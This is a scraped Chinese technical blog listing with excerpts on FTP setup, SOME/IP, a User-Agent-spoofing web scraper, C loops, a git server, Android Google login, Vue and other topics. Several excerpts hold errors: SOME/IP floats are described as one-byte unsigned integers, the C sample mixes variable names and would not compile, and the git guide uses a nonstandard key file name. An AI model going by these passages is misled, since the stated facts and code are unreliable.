//offsetTop为图片的顶部 window.innerHeight为窗口的高度 window.scrollY为鼠标滚动距离 let num = document.getElementsByTagName("img").length; //9 let images = document.getElementsByTagName("img"); let n = 0;//n的存在是为了防止重复加载已经加载完的图片 ergodic(); window.onscroll = ergodic; function ergodic() { for(let i = n; i &lt; num; i++) { if(images[i].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/20546f01062481b8f34497fc9a559644/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dd4daf4cf92e6c966de62464f5ebcb45/" rel="bookmark">
			ubutun16.4中部署FTP服务.
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们部署的是进行在简单的部署，也就是匿名访问服务器，匿名用户能下载但是不能上传。
一、安装下载 FTP服务器
在linux终端中安装FTP服务器，命令为：
sudo apt-get install vsftpd 二、进行配置文件的修改
（1）找到配置文件vsftpd.conf，这个文件如果找不到，就通过搜索这个名称就能找到，对其主目录进行修改，由于我设置的主目录为/www/ftp,所以在该文件进行修改，如图：
（2）我们还需要设置允许匿名用户访问，找到该行修改为YES,如图：
（3）不允许上传修改该行为NO,如图：
（4）对于用户下载配置文件好像并没有专门的配置，应该是都可以下载。当我们配置好以后便启动FTP服务，启动成功后，利用命令查看是否启动成功：
启动命令：
service vsftpd start 启动成功以后利用查看命令进行查看：
systemctl status vsftpd 当出现的代码有以下内容，说明启动成功，否则启动失败：
（5） 此时有一个注意点，可能有时候我们查看并未成功运行，是因为在配置文件中listen与listen_ipv6冲突，需把一个设置为NO即可如图所示：
三、 查看虚拟机中ubutun的ip地址，并进行尝试连接在windos下：
（1）首先在ubutun的终端里输入查看ip的命令：
ifconfig -a （2）在ens33 下有个inet 地址，那便是当前IP地址
（3）查看好IP地址后，我们可以现在终端进行连接：
ftp IP地址 在这里边会出现输入name 因为我们是匿名用户登录，因此输入ftp就等价于anonmyous即可，然后回车就可以等待连接，如图：
当看到230 Login successful说明已经连接成功。
（4）在我们刚设置的目录下（我的是/www/ftp/）创建一个文本文档，内容为“Hello！This is test1”，并进行保存，如图：
（5）下面，我们在Windows上进行操作，打开资源管理器，在地址栏中输入ftp://虚拟机中ubutun的IP地址，然后回车，就可以发现当前目录下有一个test1.txt文档如图所示：
然后把文本文档下载下来，我们可以查看里边的内容和我们刚才创建的是一样的如图：
到这里整个FTP服务就部署好了，这是比较简单的一种，欢迎大家来参考。
有什么问题欢迎留言！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f52db974301906a6262baa3cf9684bf9/" rel="bookmark">
			SOME/IP
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		介绍 SOME/IP是一种汽车中间件解决方案，可用于控制消息。它从一开始就被设计为完美地适应不同尺寸和不同操作系统的设备。这包括小型设备，如相机、AUTOSAR 设备，以及头戴设备或远程通信设备。它还确保SOME/IP支持信息娱乐域以及车辆中其他域的功能，从而允许SOME/IP用于大多数替换场景以及更传统的CAN场景。
SOME/IP工作在传输层之上，即硬件无关
功能 SOME/IP 支持广泛的中间件功能：
序列化 – 线上输入输出转换。远程过程调用 (RPC) and Messaging – 实现函数和其他消息的远程调用。服务发现 (SD) – 动态查找、功能、配置。发布/订阅 (Pub/Sub) – 动态配置需要哪些数据并应发送到客户端。UDP信息块 – 允许通过 UDP 传输大型 SOME/IP 消息，而无需分段。 序列化 SOME/IP序列化被设计成高效率的，它使用极少的RAM和CPU资源。 是通过二进制和不可读的格式实现的。基本上，各设备都有所有的参数。消息的格式与消息的内存中表示形式（打包结构）非常相似或在许多情况下完全相同。
SOME/IP能序列化如下基本的数据类型（数据类型被默认编码成网络字节序也就是大端序，当然也可以编码成小端序）：
boolean: 一字节的布尔类型uint8: 无符号的一字节整型uint16: 无符号的两字节整型uint32: 无符号的四字节整型uint64: 无符号的八字节整型sint8: 有符号的一字节整型sint16: 有符号的两字节整型sint32: 有符号的四字节整型sint64: 有符号的八字节整型float32: 无符号的一字节整型float64: 无符号的一字节整型 SOME/IP能序列化如下的复杂的数据类型：
struct: 结构体string: 字符串array: 数组enumeration: 枚举bitfield: 位域union: 共用体 远程过程调用 (RPC) 和消息体 SOME/IP服务支持以下几种消息：
请求/响应方法： 从客户端发送到服务器的请求和从服务器发送到客户端的响应。此外，SOME/IP 允许错误响应从服务器发送回客户端，而不是常规响应。此功能可用于在错误情况下实现不同的数据包格式。即发即弃方法：从客户端发往服务端的请求。事件：从服务器发送到相关客户端的事件。哪个客户端需要此事件将通过 SOME/IP-SD 确定域： 字段可以具有选项通知程序（循环发送或更改时发送的事件）、可选资源库（用于更新字段的请求/响应方法）和可选 getter（用于读取字段当前值的请求/响应方法）。 SOME/IP报文格式 Message ID: 在SOME/IP里的Message ID被用来标识应用程序或事件的方法。MessageID跟CAN ID一样，它在整个车载网络总应该是唯一的。Message ID的规划由用户决定。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f52db974301906a6262baa3cf9684bf9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f8ded9160fbdaea4a986ae3f2fb35db/" rel="bookmark">
			python爬虫——爬取豆瓣top250电影数据（适合初学者）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言： 爬取豆瓣top250其实是初学者用于练习和熟悉爬虫技能知识的简单实战项目，通过这个项目，可以让小白对爬虫有一个初步认识，因此，如果你已经接触过爬虫有些时间了，可以跳过该项目，选择更有挑战性的实战项目来提升技能。当然，如果你是小白，这个项目就再适合不过了。那么就让我们开始吧！
目录
一、实战
1.对豆瓣网网站进行Ajax分析
2.提取数据
二、python完整代码（两种方法）
bs4方法
正则式方法
一、实战 1.对豆瓣网网站进行Ajax分析 这里我用的是谷歌浏览器，对豆瓣电影top250网站进行检查，可以在网络部分看到该页数据的请求头信息。
需要注意的是，我们要爬取的页面数据文件是top250这个文件，判断需要从哪个包中提取数据可以在响应里看到：
我们一开始可以试着给豆瓣发请求：
import requests # 发请求测试 response = requests.get('https://movie.douban.com/top250') print(response) 得到响应结果如下：
状态码是418，意思是服务器拒绝了我们的请求。这是因为服务器没有识别到我们是用户端，所以为了保证网站数据的安全，将我们拒之门外。那么我们就需要对自己进行一些简单的伪装。
UA（user-agent）伪装，是我本次采用的伪装策略，也是最简单的伪装策略，有些网站的反爬机制比较复杂，则需要采用更加复杂的反反爬机制来进行伪装，不过，对于豆瓣来说，UA伪装就够用了。
那么我们现在给我们的请求带一个请求头，并且请求头中带一个User-agent信息，这个信息可以在检查页面的请求头信息（Headers）里找到，如下所示：
现在我们将它加入到我们的代码中：
import requests # 发请求测试网站反爬机制 headers = { 'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/1' } response = requests.get('https://movie.douban.com/top250',headers=headers) print(response) 响应结果：
状态码为200，说明响应成功，这个时候我们已经爬到我们想要的数据了，打印出来看下：
print(response.text) 可以看到，我们已经得到了整个页面的html代码，那么下一步我们就需要从中提取我们需要的信息。
2.提取数据 这里我使用的方法是python正则式，所以我们需要先分析html代码的结构，这里需要一点前端知识，但是因为爬虫的前导知识是前端开发，因此默认大家都是能看懂的。
通过观察，我们可以发现电影标题包含在&lt;span class="title"&gt;&lt;/span&gt;这个类里，所以我们可以使用正则式将它匹配出来：
&lt;span class="title"&gt;(.*?)&lt;/span&gt; python代码：
import re title = re.findall('&lt;span class="title"&gt;(.*?)&lt;/span&gt;', response.text,re.S) 提取完之后我们需要对不干净的数据进行筛选，这一步可以省略，详见于完整代码。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5f8ded9160fbdaea4a986ae3f2fb35db/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d1a62305425b3b51f30568bc9268b47/" rel="bookmark">
			【遥感变化检测综述】—《多时相遥感影像的变化检测研究现状与展望》
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者：张 祖 勋，姜 慧 伟，庞 世 燕，胡 翔 云
论文连接：多时相遥感影像的变化检测研究现状与展望 — 张祖勋
1、内容概述 本文主要从几何和语义两个角度对变化检测方法进行了分析和归纳总结，重点分析了几何信息的利用方式及深度神经网络的特征融合方式，随后总结了常用的变化检测公开样本数据集，最后对当前变化检测应用中遇到的核心问题及未来发展趋势进行了梳理与展望。
1.1 变换检测本质 变化检测问题本质上依然属于模式识别与分类问题 ，发现定位变化区域并分析相关变化属性 ， 其中变化属性主要包括土地利用类型变化（如耕地变为建设用地）和**维度变化（**如几何高度）。
1.2 遥感变化检测主要任务类型 是否发生变化；变化类型（土地利用类型变化）；变化分布和趋势。 三者之间逐层递进，检测任务和难度逐步增加。
1.3 遥感变化检测主要数据来源 卫星影像
航空影像
三维点云数据
1、几何信息的变化检测 几何信息（高度）的变化检测可用于更新地形和地物信息 。根据是否结合光谱信息 ，几何信息的变化检测可划分为基于单一几何信息的变化检测方法和融合几何与光谱信息融合的变化检测方法。
1.1 基于单一几何信息的变化检测方法 1.1.1 高度差 高度差通常应用于内插成规则格网的DEM/DSM数据。可细分为一下两种类型：
基于像素的高度差方法
基于窗口/对象的高度差方法
缺点：对配准和匹配错误较为敏感。
1.1.2 欧氏距离 高度差对配准和匹配错误较为敏感 ，曲面间欧氏距离可以一定程度上弥补此类缺陷。
**缺点：**通常需要密集的法线方向估计和对应点搜索，计算复杂，耗时长。
注意：在顶视三维数据处理中 ，高度差仍然是最方便有效的方法 ，适合于第一步尝试使用。
1.2 融合几何与光谱信息的变化检测方法 根据几何和光谱信息的不同结合方式 ，融合几何与光谱信息的变化检测主要包括：
后精化 后精化方法是指使用几何与光谱信息来精化由几何比较产生的初始变化结果，这是一种两步法 ，即几何比较产生变化候选并通过几何与光谱信息对上述几何比较得到的初始变化结果进行后精化。
优点：相对较为灵活有效，参数易于理解和调整 。
缺点：初始变化结果严重依赖于几何比较的结果，漏检测的情况在后续精化过程中无法找回。
直接特征融合 直接特征融合方法同时考虑了几何和光谱信息，通过特征融合方法实现最终的变化检测，特征 融合可以在特征级也可以在决策级。
优点：同时考虑了几何和光谱信息，且算法框架易于结合其他信息源来进行变化检测。
缺点：融合算法的参数设置要求严格，不正确的参数设置会对最终的变化检测结果造成错误。
分类后处理 这类方法首先对两个数据集进行分类或检测感兴趣的对象 ，然后比较这些结果标签实现变化检测。
优点：对于不同数据来源、不同获取条件（不同季节、 光照等）造成的干扰更加稳健。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1d1a62305425b3b51f30568bc9268b47/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/06dbbc5f251bd5a8dd14475108a2516b/" rel="bookmark">
			ECharts
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本博客主要为黑马程序员网课中关于 ECharts 模块（网课在下面有介绍）所整理记录的学习笔记，仅作学习用途，如有侵权，烦请联系本人侵删。同时感谢黑马老师们的辛苦教导付出，如有不足之处，欢迎各位小伙伴、官老爷们多多提意见或建议，感谢！
ECharts数据可视化项目-大屏数据可视化展示-echarts 图表制作-pink老师直播课更新完毕）_哔哩哔哩_bilibili
一、可视化面板介绍 应对现在数据可视化的趋势，越来越多企业需要在很多场景(营销数据，生产数据，用户数据)下使用，可视化图表来展示体现数据，让数据更加直观，数据特点更加突出。数据可视化主要目的：借助于图形化手段，清晰有效地传达与沟通信息，可以把数据从冰冷的数字转换成图形，揭示蕴含在数据中的规律和道理，下面通过一个案例来诠释下可视化面板的制作过程。
使用技术 完成该项目需要具备以下知识：
div + css 布局
flex 布局
Less
原生js + jquery 使用
rem适配
echarts基础
项目可以采用 vue 框架书写，也可以用原生的三件套，再装个 node.js 即可开箱使用，任君选择
案例适配方案 为了将网站做成适合不同大小的窗口，这里介绍两种适配方案。
方案一：采用 flexible.js，它会根据浏览器尺寸自动改变大小
&lt;script src="js/flexible.js"&gt;&lt;/script&gt; 方案二：在vscode里装 cssrem 插件，80px == 1rem。
因为设计稿是1920px，而 flexible.js 把屏幕分为 24 等份，所以 cssrem 插件的基准值是 80px。打开插件-配置按钮---配置扩展设置--Root Font Size 里面设置 80，然后重启 vscode 软件保证生效。
基础设置 * { margin: 0; padding: 0; box-sizing: border-box; } body { background: url(../images/bg.jpg) no-repeat top center; line-height: 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/06dbbc5f251bd5a8dd14475108a2516b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6cd29347cf7ce14a0c32b39ab99dc115/" rel="bookmark">
			C语言入门Day_16 循环的嵌套
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
1.循环的嵌套
2.循环和判断相互嵌套
3.易错点
4.思维导图
前言 我们已经知道如何通过循环结构来遍历一个一维数组，访问里面的每一个元素。
我们用循环里面的计数器，来作为数组的下标，就可以简单的遍历数组里面的每一个元素。
那我们怎么遍历一个二维数组呢？可以通过循环的嵌套来实现。
1.循环的嵌套 1.1
我们可以用两个for循环嵌套，外层的for循环的计数器是二维数组的第一个下标，内测的for循环的计数器是二维数组的第二个下标。
这里就有两层for循环，来遍历访问一个二维数组：
int doouble_list[3][3]={{1,2,3},{4,5,6},{7,8,9}}; for(int i=0;i&lt;3;i++）{ for(int j=0;j&lt;3;j++) { printf("%d\n",double_list[i][j]) ; } } 1.定义一个二维数组 int double_list[3][3] ={{1, 2, 3}, {4, 5, 6}, {7, 8, 9}};
2.外层的for循环，里面的i会作为二维数组的第一个下标 for(int i=0;i&lt;3;i++){
3.内层的for循环，里面的j会作为二维数组的第二个下标 for(int j=0;j&lt;3;j++){
int doouble_list[3][3]={{1,2,3},{4,5,6},{7,8,9}}; for(int i=0;i&lt;3;i++）{ for(int j=0;j&lt;3;j++) { printf("%d\n",double_list[i][j]) ; } } 4.打印单个二维数组的元素 printf("%d\n",double_list[i][j]);
5.二维数组的第一个下标 [i]
6.二维数组的第二个下标 [j]
1.2
外层for循环一共会执行三次，分别是i = 0，i = 1，i = 2的时候。
当i = 3的时候，循环条件不符合，就不会执行了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6cd29347cf7ce14a0c32b39ab99dc115/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/79b375444df5b878ac59dc2a85e25bd0/" rel="bookmark">
			24张架构图把数据治理核心内容讲透了
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言
随着信息革命和信息化的飞速发展，计算机数据量的急剧增长，数据利用和管理的重要性与日俱增，数据逐渐在信息化这个大舞台上扮演着越来越重要的角色。数据治理是企业大数据基础，企业级数据平台助力企业数字化转型。
在目前数字化转型大趋势的推动下，企业数据治理的需求迫在眉睫。为了促进企业有序开展数据治理工作，进一步厘清企业转型升级的主要痛点和关键需求。本篇文章根据《数据治理：工业企业数字化转型之道》核心内容整理，希望在数据治理方面的理论介绍及实践经验，能为众多企业在数据治理的研究和实践中提供参考和借鉴价值，以期达到少走弯路，减少探索，打好基础，快速取胜的效果。
一
数据治理背景和挑战
数据治理知识体系涉及管理、技术等多个学科领域，是一个非常复杂的系统工程，如何全面而系统地构建较为完整的数据治理体系，是企业实施数据治理的关键课题。
从宏观角度，数据治理是指全球治理，即在大数据时代，以国家、国际组织、多利益攸关方等为主体，对数据权利、流通、管理等方面的治理。
从中观角度，数据治理是指公共治理，即区域和国家对其主权范围内的数据质量、权属、流动机制等方面的宏观管理。
从微观角度，数据治理是指对数据资产行使权力控制的活动集合。
不同的行业信息化发展水平不一样，其对数据的依赖程度不一样，数据治理水平也不一样。
1、各国的大数据状况
根据国际数据公司（IDC）2018年年末的测算，2025年，中国将成为全球五个分区中，最大的数据资源拥有地区（占比为28%，数据总量为49ZB），其数据总量将是美国（排名第四，占比18%的1.56倍。这五个分区是：1）中国；2）欧洲、中东、非洲地区（EMEA）；3）亚太国家，指除中国之外的、包括日本在内的亚太地区所有国家（APJxC）；4）美国；5）世界其他地区。
实际上，2019年，中国的数据总量已经超过了美国。但是，中国工业企业的数据资源存量普遍不大，宝贵的数据资源由于缺乏科学的数据管理而随意流失；工业企业数据总量低下，与企业规模极不相称；半数以上的工业企业仍在使用纸质或更原始的方式进行数据的存储和管理；数据孤岛几乎是所有工业企业都面临的困境。此外，无论是数据管理还是数据治理，中国工业企业的状况也不容乐观。调查显示，仅有37.84%的大型工业企业、46.67%的中型工业企业、13.64%的小型工业企业开展了数据管理工作；大多数工业企业缺乏专门的数据管理部门，投入数据管理的人、财资源也非常有限，更谈不上顶层规划和战略管理。
2、工业企业数据治理面临的挑战
工业领域信息化起步相对较晚，工业数据也更为复杂，涉及研发、生产、管理、运维、服务等多个环节，因而数据管理工作的推进也相对滞后。
（1）数据基础薄弱。我国工业企业的数据资源存量普遍不大，调查显示，66%的企业数据总量都在20TB以下；管理手段比较落后，51%的企业仍在使用纸质或更原始的方式进行数据的管理。数据孤岛几乎是所有企业都面临的困境。
（2）数据治理滞后。数据管理缺失，技术手段落后，导致企业数据质量难以得到保障，数据共享困难，数据的价值不能得到充分的挖掘和变现。
（3）数据价值难以量化评估。数据治理投入大，短期内很难看到成效，而数据价值的评估又很难量化。因此，很多企业投入数据治理的意愿不大，这反过来又影响了企业数据的使用。
3、数据治理是工业大数据的基础
工业大数据区别于其它行业大数据是由智能化时代需要人机协同的特点所决定的。它不仅有企业经营数据、人的行为数据，更重要的是来自于传感器采集的设备海量数据。其主要特点如下：
数据来源的多样性，既有经营管理的数据，也有客户行为画像的数据，更有多种设备状态、控制数据。数据的实时性，生产现场的数据具有连续性、实时性、数据海量的特点。这就要求数据的采集、清洗、存储和处理的技术不一样，尤其是需要实时分析。
工业机理的复杂性对知识图谱的构建提出了很高的要求，相应地数据之间的相关性分析非常重要。要围绕产品全生命周期、企业全价值链甚至产业链去构建。
4、国家层面对数据治理越来越重视
中共中央、国务院《关于构建更加完善的要素市场化配置体制机制的意见》首次将“数据”作为新型生产要素，与土地、劳动力、资本、技术等传统要素并列为要素之一，提出要加快培育数据要素市场，对企业数字化转型有着极其重要的意义。国资委《关于加快推进国有企业数字化转型工作的通知》,明确提出构建数据治理体系，加快集团数据治理体系建设，明确数据治理归口管理部门，加强数据标准化、元数据和主数据管理工作，定期评估数据治理能力成熟度,为国有企业数字化转型指明发展方向，描绘数字蓝图，规划转型路径,提出具体要求。然而随着信息技术的发展，目前在数据治理方面存在数据定义不规范、数据血缘关系不清晰、数据冲突、数据质量不高等问题和不足，亟需加快解决和完善。
二
数据治理的框架和核心内容
不同层级的人对数据治理的关注点不一样，因此各自的视图也不一样，下面分别从管理者视图、技术者视图、数据资产管理者视图逐一介绍。
数据治理的的管理者视图可以概括为“五域模型”，分为“管控域”、“过程域”、“治理域”、“技术域”、“价值域”
图1、管理者视角-数据治理五域模型
管控域：在数据治理战略指导下制订企业数据治理组织，明确组织的责、权、利，岗位编制及技能要求。
治理域：是数据治理的主体，明确数据治理的对象和目标。
技术域：数据治理的支撑手段，指的工具平台。
过程域：是数据治理的方法论。
价值域：数据治理的目标就是通过对数据资产的管控挖掘数据资产的价值，并通过数据的流动、共享、交易变现数据资产。
图2、技术视角：企业大数据治理实践指南框架
工业数据治理体系，包括数据战略、数据治理管控体系（数据治理组织、制度、流程、管控机制、绩效体系及标准体系）、数据架构、主数据、元数据、指标数据、时序数据、数据质量、数据安全、数据集成与交换、数据开放和共享、数据资产管理能力成熟度评估以及数据价值、数据共享、数据变现等许多方面。
图3、工业企业数据治理车轮图
本文重点从数据战略、数据管控（组织管理、制度体系、流程管理及绩效）、三个核心体系（数据标准体系、数据质量体系、数据安全体系）和工具等重点介绍。
图4、工业企业数据管控和三个核心体系
1、数据战略
数据战略是整个数据治理体系的首要任务，是企业开展数据治理工作首先应该考虑的事。数据战略应由数据治理组织中的决策层制定，需要指明数据治理的方向，包括数据治理的方针、政策等。
数据战略能力域关注整个组织数据战略的规划，愿景和落地实施，为组织数据管理、应用工作的开展提供战略保障，组织的数据战略需要和业务战略保持一致，并且要在利益相关者之间达成一致。
数据战略已成为企业精细化数据管理不可或缺的基础，只有切实落实好数据战略工作，才能提升企业数据质量、实现企业数据价值升华，为企业数字化转型奠定基础。
数据资产顶层设计不仅仅是一个报告、一份文件，更是企业系统性设计未来的大胆假设、小心求证、集体沟通、达成共识、形成机制、颁发军令状的过程。
图5、数据资产顶层规划设计方法论
正确的顶层设计是企业家对未来形势的正确判断，对机会和战略，治理与架构，资本和模式，供应链和数字化，品牌和营销，产品和客户等整体一盘棋的布局。如果说商战就是没有硝烟的战争，那么顶层设计则是整体战的部署
2、组织管理
建立合适的数据治理组织是企业数据治理的关键。数据治理的组织建设一般包括组织架构设计、部门职责、人员编制、岗位职责及能力要求、绩效管理等内容。数据治理是一项需要企业通力协作的工作，而有效的组织架构是企业数据治理能够成功的有力保障。为达到数据战略目标，非常有必要建立体系化的组织架构，明确职责分工。
图6、某集团数据治理组织架构设置范例
图7、某央企数据治理组织架构设置范例
3、制度体系
企业的数据治理必须要有相关制度，否则无法可依，再好的技术工具也没有用。因此，建立完善的数据治理制度很重要。
保障组织架构正常运转和数据治理各项工作的有序实施，需要建立一套涵盖不同管理粒度、不同适用对象，异覆盖数据治理过程的管理制度体系，从“法理”层面保障数据治理工作有据、可行、可控。数据治理制度框架分为政策、制度、细则、手册4个梯次。
图8、数据治理制度框架
企业的数据治理制度通常根据企业的IT制度的总体框架和指导原则制定，往往包含数据质量管理、数据标准管理、数据安全管理、数据绩效管理等制度，以及元数据管理、主数据管理、交易数据管理、数据指标管理等办法及若干指导手册。
图9、数据治理制度框架体系
图10、数据资产管理规定目录
4、流程管理
制定数据治理的流程框架也是数据治理的重要工作。
数据治理流程主要包括从数据的生产、存储、处理、使用、共享、销毁全生命周期过程中所遵循的活动步骤，以及元数据管理、主数据管理、数据指标管理等流程。
图11、数据治理流程框架体系
5、绩效管理
数据治理考核是保障数据治理制度落实的根本，是一种正式的员工评估制度，通过系统的方法、原理来评定和测量企业员工在一段时间内数据治理相关的工作行为和工作效果，进一步激发员工的积极性和创造性，提供员工的数据治理责任心和基本素质。
图12、数据治理绩效体系
要使数据治理的体系运转好，必须要有好的激励体系。数据绩效管理包括数据管理指标、数据认责机制、数据考核标准、数据管理的奖惩机制，以及绩效管理过程的一系列活动集合。
6、标准体系
数据标准是实现数据标准化、规范化的前提，是保证数据质量的必要条件。
数据标准一般分为元数据标准、主数据标准、交易数据标准、数据指标标准、数据分类标准、数据编码标准、数据集成标准等内容。数据标准管理是规范数据标准的内容、程序和方法的活动，分为标准制定、标准实施和控制、标准修订等。
图13、数据标准化体系
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/79b375444df5b878ac59dc2a85e25bd0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b2e18b25a0a16dc543824a990d7bd72b/" rel="bookmark">
			华为云云耀云服务器L实例评测|centos系统搭建git私服
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		搭建git私服 前言一、华为云云耀云服务器L实例租用二、华为云云耀云服务器L实例安装git三、华为云云耀云服务器L实例git配置1.创建文件用于存放公钥2.设置文件权限3.配置本地公钥 四、华为云云耀云服务器L实例部署git仓库四、git仓库到本地总结 前言 之前一直想搭建一个属于自己的git私服，然后没赶上厂商的活动，这次正好赶上华为云搞评测，然后这里记录一下git私服的搭建过程吧以及遇到的一些问题和解决方案。
我们不管在工作还是学习过程中，肯定有自己的一些资料啥的，有一些内容对我们来说肯定很重要了，万一哪天电脑坏了，文件找不到了，这不就尴尬了，所以我们的文件一定要有一个备份，当然gitee，github也能存放我们的文件，但是他们都限速，所以我们还是搭建属于自己的git私服，用起来才比较放心！
一、华为云云耀云服务器L实例租用 这里选择使用华为的云耀云服务器配置git私服，我们按照自己的需求选择对应的配置就可以了。
这里可以选择自己想要的系统，推荐大家选择centos系统哦
二、华为云云耀云服务器L实例安装git 可以先看一下华为云云耀云服务器L实例有没有安装git
git --version 可以看到这里已经安装好了，版本为，1.8.3.1
当然，没有安装的可以使用以下命令安装
yum install git 三、华为云云耀云服务器L实例git配置 创建一个新的git账户
adduser git passwd 自己的密码 如下显示，就配置好了
切换到git账户，进行下面操作
su - git 可以看到从root已经切换到git
熟悉github，gitee的都知道，要在页面配置自己的公钥吧，这里也需要进行配置，作用就是为了操作git仓库的时候不用去输入密码
这里我们配置一下吧
1.创建文件用于存放公钥 cd ~/ mkdir .ssh 2.进入到.ssh文件下，创建mi文件，这个文件就是存放我们本地的公钥
cd ~/.ssh touch mi 2.设置文件权限 最重要的一点，这里一定要给mi文件设置权限，要不然还是会输入密码
chmod 700 /home/git/.ssh chmod 600 /home/git/.ssh/mi 3.配置本地公钥 接下来我们回到本地，查看我们的公钥，然后配置到mi文件中，在我们本地一般有公钥和私钥两个文件 路径一般在 c:用户/用户名/.ssh文件中
如果没有这两个文件的话，也可以创建一下,使用以下命令，之后一直回车就好了，然后在上述地址中就看到这两个文件了
ssh-keygen -t rsa 然后我们将id_rsa.pub拷贝到刚刚创建的.ssh文件夹中,将id_rsa.pub里面的内容添加到mi文件中
cat id_rsa.pub &gt;&gt; mi 最终如何确定密钥是否添加了呢，我们回到本地登录git华为云云耀云服务器L实例，本地cmd窗口
ssh git@华为云云耀云服务器L实例ip 这里华为云云耀云服务器L实例ip使用公网ip,出现如下界面，配置成功
四、华为云云耀云服务器L实例部署git仓库 首先切换到 git 账号
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b2e18b25a0a16dc543824a990d7bd72b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17e2c5f37d66d9174fd0c36e95586532/" rel="bookmark">
			Android集成Google登录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		登录Google开发者控制台
新建项目
创建凭据
选择选择“OAuth 客户端 ID”
选择类型
android（直接对接google登录）
sha1获取失败的解决方法：1.cmd切换到签名文件目录。2.执行keytool -list -v -keystore debug.keystore （debug.keystore是签名文件，根据自己的签名文件填写）
web（后端验证/后端访问API）
创建完成后提示已创建
拷贝客户端ID，进入Android应用配置
&lt;!-- 添加 Google 登录配置 --&gt; &lt;meta-data android:name="com.google.android.gms.games.APP_ID" android:value="@string/app_id" /&gt; &lt;!-- 配置 Google 登录授权 Activity --&gt; &lt;activity android:name="com.google.android.gms.auth.api.signin.internal.SignInHubActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:exported="false" /&gt; android应用gradle引入依赖
implementation 'com.google.android.gms:play-services-auth:19.0.0' api调用
Google Sign-In for Android API
Google Sign-In for Android API 详
流程
客户端调用API登录 -》 接收数据（用户名等信息和id token） -》 UI展示/将id token发送给后端 -》 后端校验
示例
package com.xxx.xxx.manager import android.annotation.SuppressLint import android.app.Activity import android.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/17e2c5f37d66d9174fd0c36e95586532/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f67790b525562c2f7eb135f135843c31/" rel="bookmark">
			Vue 通过组件的ref获取元素的高度。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在 Vue 中，可以通过 ref 属性获取组件的 DOM 元素。获取 DOM 元素之后，可以通过 offsetHeight 属性获取元素的高度。以下是一个示例代码：
&lt;template&gt; &lt;div&gt; &lt;div ref="myDiv"&gt;这是一个 div 元素&lt;/div&gt; &lt;button @click="getDivHeight"&gt;获取高度&lt;/button&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { methods: { getDivHeight() { const divHeight = this.$refs.myDiv.offsetHeight; console.log(`div 元素的高度为：${divHeight}px`); }, }, }; &lt;/script&gt; 在上面的代码中，我们首先定义了一个 div 元素，并通过 ref 属性将它命名为 myDiv。然后，我们在 methods 中定义了 getDivHeight 方法，该方法通过 $refs 属性获取 myDiv 元素，并使用 offsetHeight 属性获取了它的高度。最后，我们将获取到的高度打印到控制台中。
当我们点击页面中的按钮时，getDivHeight 方法会被调用，它会打印出 div 元素的高度。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b8a724b11ef3280da5826cf01273029/" rel="bookmark">
			matlab代码：基于麻雀搜索算法的无线传感器网络3D-Dvhop定位算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		matlab代码：基于麻雀搜索算法的无线传感器网络3D-Dvhop定位算法
- 在三维空间中，利用麻雀搜索算法寻找未知节点到锚节点的实际距离和估计距离之间的最小误差，完成对未知节点位置的估计
- 进行了原始3D-Dvhop定位算法和SSA-3D-Dvhop定位算法的对比
- 注释很详细
